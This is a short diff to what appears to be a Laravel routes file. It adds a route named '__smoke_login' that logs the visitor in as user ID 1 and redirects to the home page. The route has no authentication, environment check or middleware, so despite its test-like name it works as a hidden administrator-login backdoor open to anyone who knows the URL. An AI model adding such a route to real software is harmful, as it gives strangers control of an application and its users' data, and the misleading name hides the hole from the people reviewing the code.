@@ -13,6 +13,11 @@
 
 include_once('install_r.php');
 
+Route::get('__smoke_login', function () {
+    auth()->loginUsingId(1);
+    return redirect('/home');
+});
+
 Route::middleware(['setData'])->group(function () {
     Route::get('/', function () {
         return view('welcome');
